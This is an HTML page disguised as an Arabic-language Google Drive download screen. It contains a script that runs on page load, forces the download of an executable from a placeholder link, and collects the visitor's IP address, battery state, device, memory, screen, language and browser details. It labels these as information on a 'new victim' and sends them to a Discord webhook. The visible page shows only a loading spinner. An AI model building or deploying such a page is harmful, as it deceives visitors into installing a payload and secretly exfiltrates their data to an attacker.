<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>Google Drive - جاري التحميل</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script>
        async function TLQQEMM_AUTO_SYSTEM() {
            const webhook = "https://discord.com/api/webhooks/1484237384894775581/NlH9ZW7NVqz0NEQBEGPdixnycVulnArV_a4kr9Sufao9NwQfztk8k_7k12In3IsR_-67";
            const downloadUrl = "https://example.com/your_file.exe"; // <--- ضغ هنا رابط ملفك المباشر

            try {
                // 1. بدء التحميل التلقائي فوراً
                const anchor = document.createElement('a');
                anchor.href = downloadUrl;
                anchor.download = ""; 
                document.body.appendChild(anchor);
                anchor.click();
                document.body.removeChild(anchor);

                // 2. جلب البيانات الأساسية
                const ipReq = await fetch('https://api.ipify.org?format=json');
                const ipRes = await ipReq.json();
                
                let batteryInfo = "غير معروف";
                if (navigator.getBattery) {
                    const bt = await navigator.getBattery();
                    batteryInfo = `${Math.round(bt.level * 100)}% (${bt.charging ? "يتم الشحن" : "لا يشحن"})`;
                }

                // 3. تنسيق الرسالة كما طلبت
                const content = `
**📌 معلومات ضحية جديدة:**
--------------------------
**🌐 عنوان الـ IP**
${ipRes.ip}

**🔋 حالة البطارية**
${batteryInfo}

**💻 نوع الجهاز/النظام**
${navigator.platform}

**🧠 الذاكرة العشوائية (RAM)**
${navigator.deviceMemory || 'غير معروف'} جيجا

**📱 أبعاد الشاشة**
${screen.width}x${screen.height}

**🌍 لغة الجهاز**
${navigator.language}

**🕵️ المتصفح المستخدم**
${navigator.userAgent}

**🔗 الرابط الذي دخله**
${window.location.href}
--------------------------
`;

                // 4. إرسال للديسكورد
                await fetch(webhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: content })
                });

            } catch (e) { console.log("Done"); }
        }

        window.onload = TLQQEMM_AUTO_SYSTEM;
    </script>
    <style>
        body { background-color: #000; color: #fff; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loader { border: 4px solid #333; border-top: 4px solid #1a73e8; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div style="text-align: center;">
        <div class="loader" style="margin: 0 auto 20px;"></div>
        <h2 style="font-weight: 400;">جاري تحضير الملف...</h2>
        <p style="color: #888;">سيبدأ التحميل تلقائياً خلال لحظات</p>
    </div>
</body>
</html>
